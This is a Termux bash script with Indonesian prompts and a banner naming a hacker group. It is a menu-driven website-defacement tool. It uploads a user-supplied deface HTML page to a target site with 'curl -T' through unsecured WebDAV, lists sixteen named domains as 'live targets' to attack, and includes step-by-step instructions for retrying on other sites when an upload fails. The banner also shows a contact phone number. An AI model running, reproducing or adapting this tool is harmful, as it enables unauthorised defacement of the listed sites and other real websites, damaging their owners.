#!/system/xbin/bash
#Recode?
#Mati aja njeng
clear
yellow='\033[33;1m'
green='\033[32;1m'
white='\033[37;1m'
red='\033[31;1m'
echo ""
echo $red"                      #############################################"
echo $red"                      #     _      _____ ____  ____  ____        #"   
echo $red"                      #    / \  /|/  __//  _ \/  _ \/  _ \/ \ |\ #"
echo $red"                      #    | |  |||  \  | | //| | \|| / \|| | // #"
echo $white"                     #    | |/\|||  /_ | |_\\| |_/|| |-||| \/ /  #"
echo $white"                     #    \_/  \|\____\\____/\____/\_/ \|\___/   #" 
echo $white"                     #                                    V.1.0 #"
echo $white"                     ############################################"
echo ""
echo "   \033[33;1m|====================================|"
echo "   \033[31;1m|+___Author:Pineapple_303xHacen_09___+"
echo "   \033[32;1m|+___Team:|-L4EFY-| & D35TROY SQUAD__+"
echo "   \033[31;1m|+______Contact:085830556606_________+"
echo "   \033[32;1m|+_______Supported:-BUFT- 2E4H_______+"
echo "   \033[31;1m|+===INDONESIAN TERMUX ASSOCIATION===+"
echo "   \033[33;1m|====================================|"
echo ""
echo "========================================"|lolcat
echo "1. Start Webdav!"|lolcat
echo "========================================"|lolcat
echo "2. Live Target"|lolcat
echo "========================================"|lolcat
echo "3. How To Use?"|lolcat
echo "========================================"|lolcat
echo "4. Exit?"|lolcat
echo "========================================"|lolcat
read -p "Root@Pineapple_303~#" dav


if [ $dav = 1 ] || [ $dav = 1 ]
then
clear
echo "Enter script [storage/emulated/0/sc.html]"|lolcat
read -p "masukan->" sc
echo "Enter Target"|lolcat
read -p "masukan->" web
curl -T /sdcard/$sc $web
echo $red"Loading"
sleep 2
echo "Coba cek $web/$sc"|lolcat
echo $red"Kalau gagal coba masukin target lainya"
sleep 4
sh webdav.sh
fi

if [ $dav = 2 ] || [ $dav = 2]
then
clear
figlet "Live Target"|lolcat
echo "http://ayk.co.za"|lolcat
echo "http://africa-one.co.za"|lolcat
echo "http://jormid.net"|lolcat
echo "http://ratia.co.za"|lolcat
echo "http://paruks.co.za"|lolcat
echo "http://totemafrica.com"|lolcat
echo "http://tapifare.com"|lolcat
echo "http://handj.co.za"|lolcat
echo "http://megro.co.za"|lolcat
echo "http://beeit.co.za"|lolcat
echo "http://butterflowers.co.za"|lolcat
echo "http://holotropicbreathwork.co.za"|lolcat
echo "http://contsol.co.za"|lolcat
echo "http://hellomobile.mobi"|lolcat
echo "http://centraltech.co.za"|lolcat
echo "http://esfml.com"|lolcat
sleep 5
clear
sh webdav.sh
1
fi

if [ $dav = 3 ] || [ $dav = 3 ]
then
clear
echo " HOW To Use It?"|lolcat
echo "1.Tempatkan Sc deface diluar folder didalam penyimpanan 
Internal"|lolcat
echo "2. Masukan Sc deface anda(nama sc deface harus 
benar"|lolcat
echo "3.Masukan Target webnya (Sudah ada live 
targetnya"|lolcat
echo "4.tunggu prosesnya kalau gagal silahkan coba target 
lainya"|lolcat
sleep 10
sh webdav.sh
fi

if [ $dav = 4 ] || [ $dav = 4 ]
then
clear
figlet "See you"|lolcat
fi
